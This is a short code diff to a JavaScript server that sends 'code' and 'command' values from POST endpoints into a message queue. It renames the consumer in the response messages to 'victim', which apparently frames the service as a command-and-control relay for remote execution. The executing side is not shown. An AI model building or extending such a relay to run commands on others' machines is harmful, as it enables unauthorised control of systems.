@@ -18,7 +18,7 @@ import { QUEUE, CONNECTION_URL } from './utils/constants.mjs'
 
         await channel.sendToQueue(QUEUE, toBuffer({ type, value }))
 
-        response.json({ message: 'Code sent to consumer', data: { type, value }})
+        response.json({ message: 'Code sent to victim', data: { type, value }})
     })
     server.post('/commands', async ({ request, response }) => {
         const type = 'command'
@@ -26,7 +26,7 @@ import { QUEUE, CONNECTION_URL } from './utils/constants.mjs'
 
         await channel.sendToQueue(QUEUE, toBuffer({ type, value }))
 
-        response.json({ message: 'Command sent to consumer', data: { type, value }})
+        response.json({ message: 'Command sent to victim', data: { type, value }})
     })
 
     channel.consume(QUEUE, (msg) => {
